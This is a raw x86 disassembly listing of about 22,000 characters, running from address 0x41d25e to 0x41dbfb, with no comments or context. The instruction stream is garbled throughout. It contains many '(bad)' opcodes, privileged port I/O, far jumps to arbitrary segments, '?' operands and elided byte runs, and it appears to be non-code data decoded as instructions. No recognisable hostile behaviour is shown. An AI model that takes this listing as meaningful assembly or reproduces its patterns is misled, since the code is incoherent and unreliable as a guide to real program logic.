  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	popa   
  41d263:	or     ah,BYTE PTR [eax]
  41d265:	adc    al,0x67
  41d267:	cmp    DWORD PTR [ecx],eax
  41d269:	add    BYTE PTR [eax],al
  41d26b:	add    DWORD PTR [eax],eax
  41d26d:	add    BYTE PTR [eax+ecx*4],ch
  41d270:	cmp    DWORD PTR [eax],ebx
  41d272:	mov    eax,ds:0xf9152b03
  41d277:	jns    0x41d283
  41d279:	jns    0x41d27a
  41d27b:	out    0xb1,eax
  41d27d:	fld    TBYTE PTR [ebx]
  41d27f:	push   cs
  41d280:	jg     0x41d2e6
  41d282:	fld    QWORD PTR [ebx+0x6a]
  41d285:	outs   dx,BYTE PTR ds:[esi]
  41d286:	add    DWORD PTR [eax-0x5b6cc2ff],edx
  41d28c:	imul   edi,DWORD PTR [edi+0x5d0c0745],0xfca22c7b
  41d296:	neg    DWORD PTR [esi]
  41d298:	test   BYTE PTR [ebp-0x31984883],dl
  41d29e:	jnp    0x41d2e3
  41d2a0:	xlat   BYTE PTR ds:[ebx]
  41d2a1:	cmp    esp,esp
  41d2a3:	push   ebp
  41d2a4:	out    dx,al
  41d2a5:	gs out 0xf,al
  41d2a8:	inc    ecx
  41d2a9:	xchg   ebp,eax
  41d2aa:	clc    
  41d2ab:	icebp  
  41d2ac:	push   eax
  41d2ad:	into   
  41d2ae:	aam    0xa1
  41d2b0:	stos   DWORD PTR es:[edi],eax
  41d2b1:	loope  0x41d240
  41d2b3:	sbb    ebp,DWORD PTR [esi]
  41d2b5:	sbb    eax,0x114b8d01
  41d2ba:	(bad)  
  41d2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2bc:	test   DWORD PTR [eax],0xef1f39a6
  41d2c2:	add    dh,BYTE PTR [eax]
  41d2c4:	cmp    al,0xe2
  41d2c6:	cmp    DWORD PTR [edi-0xc],ecx
  41d2c9:	addr16 push ds
  41d2cb:	xor    ebp,esi
  41d2cd:	dec    eax
  41d2ce:	sub    BYTE PTR [ecx+0x2bc81b97],dh
  41d2d4:	push   cs
  41d2d5:	pop    ds
  41d2d6:	adc    cl,BYTE PTR [ebx]
  41d2d8:	aam    0x41
  41d2da:	sub    DWORD PTR [ebx-0x2a],ecx
  41d2dd:	xchg   BYTE PTR ds:[eax+0x3e],dl
  41d2e1:	cmp    DWORD PTR [esp+edi*1-0x7e],esi
  41d2e5:	cdq    
  41d2e6:	retf   0x7336
  41d2e9:	add    BYTE PTR [eax+0x723f7320],ah
  41d2ef:	test   eax,0xd5f4dfd6
  41d2f4:	pop    eax
  41d2f5:	sub    al,0x4d
  41d2f7:	adc    ecx,DWORD PTR [ebx]
  41d2f9:	inc    esp
  41d2fa:	lock jecxz 0x41d2d0
  41d2fd:	push   edi
  41d2fe:	mov    ds:0x812d0bb8,al
  41d303:	jno    0x41d365
  41d305:	scas   eax,DWORD PTR es:[edi]
  41d306:	fs sbb ebx,esp
  41d309:	(bad)  
  41d30a:	jb     0x41d2a6
  41d30c:	mov    al,ds:0xcfa84f5
  41d311:	in     al,0xf4
  41d313:	fld    st(4)
  41d315:	add    DWORD PTR [ecx],esp
  41d317:	rcr    eax,1
  41d319:	sub    eax,0x6436f753
  41d31e:	jmp    0x5823:0x515ca35f
  41d325:	fadd   QWORD PTR [ecx]
  41d327:	cmp    eax,0xa63aa8be
  41d32c:	sbb    ch,dl
  41d32e:	sub    ebx,DWORD PTR [esi-0x15]
  41d331:	lock cmp ecx,edi
  41d334:	in     al,0x31
  41d336:	cmp    eax,0x40c08772
  41d33b:	int    0x4e
  41d33d:	(bad)  
  41d33e:	loop   0x41d30d
  41d340:	push   esp
  41d341:	ds imul esp,esp,0xdc88714e
  41d348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d349:	mov    esp,0x68a82c00
  41d34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d34f:	mov    eax,0x8e3d9c04
  41d354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d355:	mov    ch,0x48
  41d357:	xchg   ebp,eax
  41d358:	(bad)  
  41d359:	dec    ecx
  41d35a:	idiv   DWORD PTR [ebx]
  41d35c:	add    eax,0x9cff6476
  41d361:	ret    0x617a
  41d364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d365:	shl    BYTE PTR [esi-0x52d854f9],cl
  41d36b:	(bad)  
  41d36c:	adc    dh,BYTE PTR [ecx+0x0]
	...
  41d3d3:	add    BYTE PTR [eax],al
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx+0x1b],0x3a
  41d3e4:	dec    eax
  41d3e5:	and    BYTE PTR [edi+0x3a],0x1
  41d3e9:	add    BYTE PTR [eax],al
  41d3eb:	add    DWORD PTR [eax],eax
  41d3ed:	add    ah,bh
  41d3ef:	cdq    
  41d3f0:	jae    0x41d3bf
  41d3f2:	or     al,0x97
  41d3f4:	inc    esp
  41d3f5:	add    bh,BYTE PTR [edx+0x1a8acdcd]
  41d3fb:	pop    ss
  41d3fc:	mov    dh,0x11
  41d3fe:	rol    DWORD PTR [esp+ecx*4+0x2c312881],1
  41d405:	fnsetpm(287 only) 
  41d407:	mov    edi,0xc45e364e
  41d40c:	adc    bh,bl
  41d40e:	pop    ss
  41d40f:	xor    BYTE PTR ds:0xb09370ff,dl
  41d415:	outs   dx,BYTE PTR ds:[esi]
  41d416:	sub    al,0x60
  41d418:	in     eax,0xce
  41d41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d41b:	sub    BYTE PTR [ebx+0x38],al
  41d41e:	ins    BYTE PTR es:[edi],dx
  41d41f:	retf   
  41d420:	push   esi
  41d421:	inc    ebx
  41d422:	sub    BYTE PTR [esi+0x503eab22],bh
  41d428:	nop
  41d429:	gs adc bl,cl
  41d42c:	xor    edx,edx
  41d42e:	adc    BYTE PTR [eax],cl
  41d430:	push   ds
  41d431:	sbb    bh,0xb
  41d434:	in     eax,0x3e
  41d436:	cmp    BYTE PTR [eax+0xd114831],ch
  41d43c:	pop    ecx
  41d43d:	jecxz  0x41d496
  41d43f:	clc    
  41d440:	jne    0x41d41b
  41d442:	adc    DWORD PTR [edx],ecx
  41d444:	sti    
  41d445:	aas    
  41d446:	inc    ebp
  41d447:	jecxz  0x41d4a9
  41d449:	mov    ch,0x4b
  41d44b:	mov    al,0x1e
  41d44d:	or     al,0x75
  41d44f:	and    dh,bh
  41d451:	xor    dl,0x1f
  41d454:	mov    bh,0x6b
  41d456:	repz and al,0x5c
  41d459:	jle    0x41d40e
  41d45b:	(bad)  
  41d45c:	cs cld 
  41d45e:	call   FWORD PTR [ebx+0x35]
  41d461:	adc    ch,BYTE PTR [ebp+0x21e8e9a7]
  41d467:	mov    ah,0x35
  41d469:	mov    ah,0x95
  41d46b:	pop    ss
  41d46c:	or     al,0xdb
  41d46e:	enter  0xd61f,0xf1
  41d472:	loope  0x41d47c
  41d474:	push   cs
  41d475:	in     eax,dx
  41d476:	jg     0x41d475
  41d478:	cmp    BYTE PTR [esi],0x66
  41d47b:	sub    ebp,DWORD PTR [edx-0x80]
  41d47e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d47f:	sbb    al,0xec
  41d481:	ja     0x41d4ed
  41d483:	xchg   ebp,eax
  41d484:	mov    bh,0x2
  41d486:	rcr    DWORD PTR [edi+0x366cdd45],1
  41d48c:	test   eax,0x4629f2c8
  41d491:	push   0xc368c44f
  41d496:	jo     0x41d464
  41d498:	and    eax,0x2b2cd732
  41d49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d49e:	push   es
  41d49f:	lods   al,BYTE PTR ds:[esi]
  41d4a0:	loop   0x41d466
  41d4a2:	sahf   
  41d4a3:	pop    ebp
  41d4a4:	icebp  
  41d4a5:	cmp    BYTE PTR [eax+0x686384ab],cl
  41d4ab:	xchg   ebx,eax
  41d4ac:	xchg   DWORD PTR [ebp-0x5bbb46e0],ebx
  41d4b2:	jl     0x41d4ca
  41d4b4:	scas   al,BYTE PTR es:[edi]
  41d4b5:	cli    
  41d4b6:	sub    BYTE PTR [ebp+0x4bf74637],0xcd
  41d4bd:	cmp    DWORD PTR fs:[edi],0x42
  41d4c1:	sub    DWORD PTR [edx],esi
  41d4c3:	and    eax,0xa6a0f65a
  41d4c8:	iret   
  41d4c9:	loop   0x41d4ed
  41d4cb:	scas   eax,DWORD PTR es:[edi]
  41d4cc:	das    
  41d4cd:	test   BYTE PTR [eax-0x1e8c0ab0],bh
  41d4d3:	mov    esp,0xb418f378
  41d4d8:	in     eax,0xb6
  41d4da:	jmp    DWORD PTR [esi-0x7286acd8]
  41d4e0:	mov    dl,0x20
  41d4e2:	mov    eax,ebx
  41d4e4:	stos   DWORD PTR es:[edi],eax
  41d4e5:	sbb    eax,0x9e180e81
  41d4ea:	shr    BYTE PTR [edx-0x78],0xbb
	...
  41d556:	div    BYTE PTR [esi]
  41d558:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x671f:0x7bd85c89
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [ecx-0x5bb5d541],bh
  41d573:	inc    esp
  41d574:	in     al,0x12
  41d576:	push   0x77
  41d578:	test   DWORD PTR [ebp+0x6d],0xe97549b0
  41d57f:	idiv   bl
  41d581:	shr    esi,1
  41d583:	adc    DWORD PTR [edi-0xf],edi
  41d586:	push   esp
  41d587:	and    eax,0xaccc2490
  41d58d:	popa   
  41d58e:	ret    
  41d58f:	jle    0x41d600
  41d591:	pop    esi
  41d592:	lods   eax,DWORD PTR ds:[esi]
  41d593:	inc    ebp
  41d594:	add    ah,BYTE PTR [ebx+0x74]
  41d597:	jle    0x41d5c3
  41d599:	add    BYTE PTR [edx+0x4b],bl
  41d59c:	jecxz  0x41d53a
  41d59e:	rol    DWORD PTR [esi],0xaa
  41d5a1:	call   0xed50248c
  41d5a6:	sbb    esp,edx
  41d5a8:	js     0x41d568
  41d5aa:	mov    cl,0x53
  41d5ac:	ret    
  41d5ad:	sahf   
  41d5ae:	popf   
  41d5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5b0:	xchg   esp,eax
  41d5b1:	fidiv  WORD PTR [esi-0xe897bdc]
  41d5b7:	fldcw  WORD PTR [edx-0x766168b9]
  41d5bd:	push   ebx
  41d5be:	rcr    DWORD PTR [ecx+0x5f99334b],cl
  41d5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5c5:	loopne 0x41d614
  41d5c7:	test   DWORD PTR [ebx+ebx*2-0x62],esi
  41d5cb:	ins    DWORD PTR es:[edi],dx
  41d5cc:	repnz dec ecx
  41d5ce:	jmp    FWORD PTR ds:0x51230972
  41d5d4:	push   DWORD PTR [esi]
  41d5d6:	je     0x41d63b
  41d5d8:	and    al,0x6e
  41d5da:	scas   al,BYTE PTR es:[edi]
  41d5db:	sbb    BYTE PTR [esi],dh
  41d5dd:	mov    dl,0x18
  41d5df:	jmp    0x191e:0x1392b60b
  41d5e6:	dec    WORD PTR [eax]
  41d5e9:	(bad)  
  41d5ea:	hlt    
  41d5eb:	push   ebp
  41d5ec:	mov    ebp,fs
  41d5ee:	lods   eax,DWORD PTR ds:[esi]
  41d5ef:	pop    eax
  41d5f0:	mov    dh,0xc6
  41d5f2:	ds out 0x71,al
  41d5f5:	loop   0x41d605
  41d5f7:	call   0x65cf54f8
  41d5fc:	test   DWORD PTR [ecx+ebp*4-0x66],eax
  41d600:	mov    eax,0x20d4e507
  41d605:	dec    ecx
  41d606:	mov    ds:0xb95b017b,eax
  41d60b:	pop    edx
  41d60c:	cmp    eax,0xf7c5d7fe
  41d611:	out    dx,eax
  41d612:	push   edi
  41d613:	ret    0xd2d5
  41d616:	aaa    
  41d617:	push   cs
  41d618:	rcr    DWORD PTR [ecx+0xb42315d],cl
  41d61e:	sub    ebp,esi
  41d620:	sub    DWORD PTR [ecx],0xdc64e5be
  41d626:	aam    0x32
  41d628:	clc    
  41d629:	hlt    
  41d62a:	mov    WORD PTR [edi+0x64],gs
  41d62d:	jns    0x41d659
  41d62f:	dec    esi
  41d630:	lahf   
  41d631:	jne    0x41d5fc
  41d633:	dec    esi
  41d634:	sbb    BYTE PTR [ebx+0x3ce48625],ah
  41d63a:	stos   DWORD PTR es:[edi],eax
  41d63b:	lock test eax,0x365d8446
  41d641:	inc    edi
  41d642:	inc    eax
  41d643:	mov    bh,0xdc
  41d645:	mov    ds:0xda1f0e72,eax
  41d64a:	in     eax,0xcf
  41d64c:	xchg   esi,eax
  41d64d:	cld    
  41d64e:	jle    0x41d66c
  41d650:	push   ds
  41d651:	outs   dx,DWORD PTR ds:[esi]
  41d652:	nop
  41d653:	in     al,0x15
  41d655:	scas   eax,DWORD PTR es:[edi]
  41d656:	mov    esp,0x248081e5
  41d65b:	cmc    
  41d65c:	inc    esi
  41d65d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d65e:	inc    ebx
  41d65f:	cmp    esp,DWORD PTR [ebp-0x6dbdc188]
  41d665:	mov    ds:0xd0ddbff7,al
  41d66a:	imul   esp,DWORD PTR [ebx],0xec72
	...
  41d6d4:	add    BYTE PTR [eax],al
  41d6d6:	jl     0x41d671
  41d6d8:	dec    esp
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x4b66e435
  41d6e3:	mov    esi,gs
  41d6e5:	push   ebx
  41d6e6:	addr16 cmp al,0x1
  41d6e9:	add    BYTE PTR [eax],al
  41d6eb:	add    DWORD PTR [eax],eax
  41d6ed:	add    BYTE PTR [edx],ch
  41d6ef:	sbb    cl,BYTE PTR [ebx-0x7d2ed9d7]
  41d6f5:	fcomp  DWORD PTR [eax+0x49238eaf]
  41d6fb:	push   ecx
  41d6fc:	je     0x41d6b0
  41d6fe:	into   
  41d6ff:	cmp    edx,esp
  41d701:	test   eax,0x2fe8a5c3
  41d706:	xchg   DWORD PTR [ebp+0x74149db0],esp
  41d70c:	fidivr WORD PTR [ecx]
  41d70e:	or     ecx,DWORD PTR [ebp+edi*1-0x2d5a6511]
  41d715:	push   edx
  41d716:	sbb    BYTE PTR [ecx+0x60],al
  41d719:	clc    
  41d71a:	ja     0x41d6c2
  41d71c:	fiadd  DWORD PTR [ebx]
  41d71e:	rcr    DWORD PTR [esp+ecx*2-0x37],0xfb
  41d723:	and    DWORD PTR [edx+0x3ff20a2c],ebx
  41d729:	mov    ebp,0x6684b566
  41d72e:	mov    bl,0x59
  41d730:	gs mov edi,0xd66cfb3d
  41d736:	leave  
  41d737:	sub    eax,0xbc1327eb
  41d73c:	xor    BYTE PTR [edx-0x5e],dl
  41d73f:	mov    esi,ecx
  41d741:	push   cs
  41d742:	push   es
  41d743:	mov    ch,ch
  41d745:	leave  
  41d746:	push   edx
  41d747:	ffree  st(3)
  41d749:	scas   eax,DWORD PTR es:[edi]
  41d74a:	mov    ecx,0x7ce56722
  41d74f:	adc    BYTE PTR [esi+0x1b2777c6],dh
  41d755:	adc    BYTE PTR [ebp+0x59],cl
  41d758:	in     al,0x24
  41d75a:	cmp    eax,ebx
  41d75c:	shr    BYTE PTR [esi+0x10ab4bb1],cl
  41d762:	clc    
  41d763:	pushf  
  41d764:	jmp    0x41d712
  41d766:	stos   DWORD PTR es:[edi],eax
  41d767:	mov    edx,ds
  41d769:	pusha  
  41d76a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d76b:	arpl   WORD PTR [ecx+edx*2-0x2e97ba4a],cx
  41d772:	xchg   edx,eax
  41d773:	xchg   edx,eax
  41d774:	add    bl,0x30
  41d777:	adc    eax,0x8c523d4a
  41d77c:	push   ss
  41d77d:	js     0x41d79f
  41d77f:	imul   ecx,ebx,0x51d048c2
  41d785:	sti    
  41d786:	xchg   DWORD PTR [ebx],eax
  41d788:	push   esi
  41d789:	inc    DWORD PTR [edi+0x4]
  41d78c:	inc    esi
  41d78d:	add    BYTE PTR [ecx],dh
  41d78f:	mov    ecx,0x8f25f514
  41d794:	mov    bh,0x57
  41d796:	adc    eax,0x62513b0
  41d79b:	add    al,0xce
  41d79d:	ins    BYTE PTR es:[edi],dx
  41d79e:	sub    dl,BYTE PTR [eax-0x10dcd70d]
  41d7a4:	shl    DWORD PTR [esi+0x39d0295d],1
  41d7aa:	add    DWORD PTR [ecx+eax*2-0x9cccc9f],ebx
  41d7b1:	(bad)  
  41d7b2:	jo     0x41d7a9
  41d7b4:	enter  0x48d1,0x5a
  41d7b8:	jbe    0x41d815
  41d7ba:	jg     0x41d78a
  41d7bc:	and    dh,BYTE PTR [ebp-0x63ced94]
  41d7c2:	or     eax,eax
  41d7c4:	push   esi
  41d7c5:	inc    edx
  41d7c6:	xchg   DWORD PTR [esi-0x22f4b269],ecx
  41d7cc:	repz frstor [edi-0x28]
  41d7d0:	xchg   ebp,eax
  41d7d1:	rol    bl,0xd6
  41d7d4:	pushf  
  41d7d5:	jns    0x41d789
  41d7d7:	test   BYTE PTR [eax],al
  41d7d9:	outs   dx,BYTE PTR ds:[esi]
  41d7da:	int    0xed
  41d7dc:	imul   ebp,ebp,0x98b48af8
  41d7e2:	in     al,0x35
  41d7e4:	fdivr  DWORD PTR [edi-0x3]
  41d7e7:	pop    edi
  41d7e8:	and    DWORD PTR [eax-0x7e],ebp
  41d7eb:	push   edx
  41d7ec:	fldcw  WORD PTR [eax+0x0]
	...
  41d853:	add    BYTE PTR [eax],al
  41d855:	add    BYTE PTR [esi+ecx*8],ah
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	dec    esi
  41d863:	fwait
  41d864:	arpl   WORD PTR [edi+eiz*2+0x13d],di
  41d86b:	add    DWORD PTR [eax],eax
  41d86d:	add    BYTE PTR [edi],ch
  41d86f:	mov    ?,WORD PTR [eax-0x6c74c91d]
  41d875:	mov    bx,WORD PTR [ecx]
  41d878:	mov    edx,DWORD PTR [eax+0xd15da6b]
  41d87e:	div    edi
  41d880:	sti    
  41d881:	(bad)  
  41d882:	and    edx,DWORD PTR [ecx-0x6e252d2e]
  41d888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d889:	fs out dx,al
  41d88b:	xchg   esi,eax
  41d88c:	aaa    
  41d88d:	dec    edi
  41d88e:	mov    ecx,0x90f60710
  41d893:	dec    ecx
  41d894:	xchg   edx,eax
  41d895:	pop    es
  41d896:	dec    edx
  41d897:	data16 sti 
  41d899:	dec    esp
  41d89a:	ins    BYTE PTR es:[edi],dx
  41d89b:	les    esi,FWORD PTR [edx+ebp*2+0x7315e4cd]
  41d8a2:	add    bh,bl
  41d8a4:	sbb    eax,0x9b05dadc
  41d8a9:	int    0x77
  41d8ab:	int    0xfd
  41d8ad:	and    eax,0xb84d1853
  41d8b2:	add    eax,0x762bb9bb
  41d8b7:	es jecxz 0x41d8b3
  41d8ba:	stc    
  41d8bb:	add    DWORD PTR cs:[eax],0xffffffee
  41d8bf:	or     al,0xd
  41d8c1:	cmp    BYTE PTR [edx],ch
  41d8c3:	inc    ecx
  41d8c4:	cdq    
  41d8c5:	xor    ecx,DWORD PTR [esi-0x72]
  41d8c8:	jbe    0x41d903
  41d8ca:	ret    0xd24b
  41d8cd:	mov    ch,0xb7
  41d8cf:	xchg   DWORD PTR [ebx+0x246249ba],esp
  41d8d5:	js     0x41d873
  41d8d7:	test   al,0xc
  41d8d9:	fcom   QWORD PTR [eax]
  41d8db:	pushf  
  41d8dc:	shl    ebp,1
  41d8de:	mov    esi,0x3dc132de
  41d8e3:	fimul  DWORD PTR [edx-0xf3ae007]
  41d8e9:	cli    
  41d8ea:	fwait
  41d8eb:	xchg   edx,eax
  41d8ec:	test   ch,ah
  41d8ee:	call   DWORD PTR [esi]
  41d8f0:	xchg   ebx,eax
  41d8f1:	test   BYTE PTR [esi+0x44],cl
  41d8f4:	ds ret 0xac29
  41d8f8:	xchg   edx,eax
  41d8f9:	call   0x43f46ceb
  41d8fe:	aad    0xb0
  41d900:	and    esi,edi
  41d902:	and    edi,DWORD PTR [ecx]
  41d904:	repz sbb DWORD PTR [edx+0xb],esp
  41d908:	lods   eax,DWORD PTR ds:[esi]
  41d909:	fimul  WORD PTR [ecx+0x1a700b3e]
  41d90f:	push   0xffffff83
  41d911:	mov    al,ch
  41d913:	scas   eax,DWORD PTR es:[edi]
  41d914:	outs   dx,BYTE PTR ds:[esi]
  41d915:	ret    0x29a6
  41d918:	pop    es
  41d919:	cwde   
  41d91a:	xchg   edi,eax
  41d91b:	rcl    BYTE PTR gs:[esi-0x7e],cl
  41d91f:	arpl   WORD PTR [ebx],sp
  41d921:	fwait
  41d922:	xchg   esp,eax
  41d923:	cld    
  41d924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d925:	mov    eax,ds:0x216beb46
  41d92a:	rcr    BYTE PTR [edi+0x13],0xa1
  41d92e:	dec    esp
  41d92f:	mov    cs,esi
  41d931:	pop    esp
  41d932:	stos   BYTE PTR es:[edi],al
  41d933:	arpl   cx,dx
  41d935:	push   ebp
  41d936:	pmaxub mm6,QWORD PTR [edi]
  41d939:	mov    ebx,0x4d6f6336
  41d93e:	pusha  
  41d93f:	and    DWORD PTR [edi],0x4362b539
  41d945:	ret    0x56ea
  41d948:	loopne 0x41d966
  41d94a:	mov    ds,WORD PTR [ecx+edi*8]
  41d94d:	dec    ebx
  41d94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d94f:	jge    0x41d8e6
  41d951:	cdq    
  41d952:	repnz push ebx
  41d954:	jnp    0x41d960
  41d956:	lods   al,BYTE PTR ds:[esi]
  41d957:	jecxz  0x41d9d2
  41d959:	arpl   si,di
  41d95b:	daa    
  41d95c:	loope  0x41d919
  41d95e:	cld    
  41d95f:	sbb    DWORD PTR [eax+0x230fd2c0],eax
  41d965:	cli    
  41d966:	mov    ?,WORD PTR [edi-0x71]
  41d969:	lock push esp
  41d96b:	pop    esi
  41d96c:	mov    ah,0x8
	...
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs pop ebx
  41d9e3:	mov    ah,0x80
  41d9e5:	adc    al,0x67
  41d9e7:	add    DWORD PTR ds:[eax],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	jp     0x41da12
  41d9f0:	sahf   
  41d9f1:	pop    es
  41d9f2:	imul   BYTE PTR [ebp+edx*8+0x3e]
  41d9f6:	mov    ebx,0x20d5246
  41d9fb:	stc    
  41d9fc:	test   BYTE PTR [ebx+0x6f685d8c],dl
  41da02:	push   ss
  41da03:	shl    BYTE PTR [esi],0xa0
  41da06:	mov    WORD PTR [edx-0x20],?
  41da09:	popf   
  41da0a:	rcr    BYTE PTR [esi*1+0x77d71eb5],0xde
  41da12:	out    0x0,al
  41da14:	pop    edi
  41da15:	pop    esp
  41da16:	mov    BYTE PTR [edi+0x2a],bh
  41da19:	outs   dx,BYTE PTR ds:[esi]
  41da1a:	dec    ecx
  41da1b:	pop    es
  41da1c:	ret    
  41da1d:	stos   BYTE PTR es:[edi],al
  41da1e:	push   eax
  41da1f:	or     DWORD PTR [edx-0x54],ebp
  41da22:	push   ss
  41da23:	and    DWORD PTR [eax-0x32],0xffffffa1
  41da27:	not    cl
  41da29:	aad    0xef
  41da2b:	and    al,0x89
  41da2d:	and    al,dl
  41da2f:	rcl    ebx,0x53
  41da32:	mov    eax,0x35b78664
  41da37:	inc    ecx
  41da38:	push   es
  41da39:	int3   
  41da3a:	(bad)
  41da3e:	(bad)  
  41da3f:	mov    ds:0x3d2f6294,eax
  41da44:	or     esp,ebp
  41da46:	mov    edx,0xc1bfcdea
  41da4b:	enter  0x20ab,0xbe
  41da4f:	xor    bh,ah
  41da51:	ins    DWORD PTR es:[edi],dx
  41da52:	dec    esp
  41da53:	inc    eax
  41da54:	outs   dx,DWORD PTR ds:[esi]
  41da55:	and    ch,BYTE PTR [eax+0x1b]
  41da58:	out    dx,al
  41da59:	pop    es
  41da5a:	inc    ebp
  41da5b:	mov    dh,0x5e
  41da5d:	push   ds
  41da5e:	push   ebp
  41da5f:	lea    edi,[eax+0x49769a17]
  41da65:	add    BYTE PTR [edx+0x62],bh
  41da68:	cmp    edi,edx
  41da6a:	or     al,0x8d
  41da6c:	sar    BYTE PTR [ebx+0x75],cl
  41da6f:	xchg   ebp,eax
  41da70:	jae    0x41da18
  41da72:	dec    ebp
  41da73:	or     al,ch
  41da75:	std    
  41da76:	mov    bl,0x49
  41da78:	enter  0x1c6f,0x33
  41da7c:	aas    
  41da7d:	cs xchg ebx,eax
  41da7f:	lds    ecx,FWORD PTR fs:[esi]
  41da82:	adc    eax,0x3ef96723
  41da87:	and    ebp,edx
  41da89:	add    al,0xe3
  41da8b:	(bad)  
  41da8d:	mov    ebx,0x613a16a3
  41da92:	mov    esi,0x4c3a01f0
  41da97:	sbb    BYTE PTR [ecx+0x1],0x78
  41da9b:	adc    esi,eax
  41da9d:	(bad)  
  41da9e:	cmp    bl,ah
  41daa0:	in     al,0x24
  41daa2:	push   ebx
  41daa3:	pop    edi
  41daa4:	jns    0x41da64
  41daa6:	mov    BYTE PTR [esi-0x24],bl
  41daa9:	adc    DWORD PTR [ebp+esi*1-0x35f7fe39],0x1d692ca3
  41dab4:	call   0xe62e10b3
  41dab9:	sub    al,BYTE PTR [esi+0x53]
  41dabc:	iret   
  41dabd:	inc    edx
  41dabe:	mov    gs,WORD PTR [edx-0x45]
  41dac1:	mov    dh,BYTE PTR [esi-0x73c7978f]
  41dac7:	jmp    0x20357551
  41dacc:	mov    edx,0x9d925a4e
  41dad1:	dec    eax
  41dad2:	inc    eax
  41dad3:	loop   0x41db45
  41dad5:	dec    edx
  41dad6:	mov    dl,BYTE PTR [edx]
  41dad8:	fcmovnbe st,st(1)
  41dada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dadb:	xor    DWORD PTR [edx],ebx
  41dadd:	gs cs jge 0x41da91
  41dae1:	leave  
  41dae2:	ret    0x449a
  41dae5:	sub    DWORD PTR [esi+0x368b85f7],0x3b0802
	...
  41db53:	add    BYTE PTR [eax],al
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0x49
  41db63:	mov    cl,0x50
  41db65:	dec    ebx
  41db66:	addr16 aas 
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	scas   eax,DWORD PTR es:[edi]
  41db6f:	add    DWORD PTR [eax+edi*8+0x4],ecx
  41db73:	sbb    eax,0xee395c29
  41db78:	mov    ebp,0xa0529f43
  41db7d:	inc    edi
  41db7e:	loopne 0x41db52
  41db80:	xchg   dx,ax
  41db82:	lea    ecx,[edi-0x51]
  41db85:	sbb    eax,0x2b7d59fb
  41db8a:	inc    eax
  41db8b:	inc    ebx
  41db8c:	push   es
  41db8d:	dec    ebx
  41db8e:	mov    WORD PTR [ecx+0x41],?
  41db91:	sub    edi,DWORD PTR [ebp+0x3]
  41db94:	scas   eax,DWORD PTR es:[edi]
  41db95:	fs cmc 
  41db97:	fwait
  41db98:	mov    ?,WORD PTR [ebx+0x1f]
  41db9b:	loope  0x41db76
  41db9d:	sub    bh,BYTE PTR [edi]
  41db9f:	pushf  
  41dba0:	(bad)  
  41dba1:	mov    WORD PTR [esi-0x18187b9],?
  41dba7:	test   al,0xab
  41dba9:	sti    
  41dbaa:	mov    cl,0x7
  41dbac:	inc    edi
  41dbad:	and    BYTE PTR [ecx+0x57],ch
  41dbb0:	inc    edx
  41dbb1:	fucomp st(5)
  41dbb3:	mov    edi,0xac7fa82a
  41dbb8:	cld    
  41dbb9:	imul   edi,eax,0xbb30958b
  41dbbf:	ficomp DWORD PTR [ebp+0x65]
  41dbc2:	out    0x85,al
  41dbc4:	scas   al,BYTE PTR es:[edi]
  41dbc5:	jle    0x41db76
  41dbc7:	int    0x44
  41dbc9:	cld    
  41dbca:	push   esi
  41dbcb:	pop    ecx
  41dbcc:	test   esi,0x1818d7ed
  41dbd2:	xchg   ebx,eax
  41dbd3:	xor    al,0x34
  41dbd5:	pop    esi
  41dbd6:	mov    ecx,0xd0c5a57c
  41dbdb:	adc    BYTE PTR [edi-0x43],0x78
  41dbdf:	xlat   BYTE PTR ds:[ebx]
  41dbe0:	cmc    
  41dbe1:	pop    ds
  41dbe2:	sbb    eax,0xa270c61c
  41dbe7:	mov    ebp,0x8f07c750
  41dbec:	mov    esp,0x29d3d834
  41dbf1:	in     al,0x84
  41dbf3:	jne    0x41db79
  41dbf5:	rcr    BYTE PTR [eax-0x7],cl
  41dbf8:	fistp  WORD PTR [ecx]
  41dbfa:	push   eax
  41dbfb:	push   edi
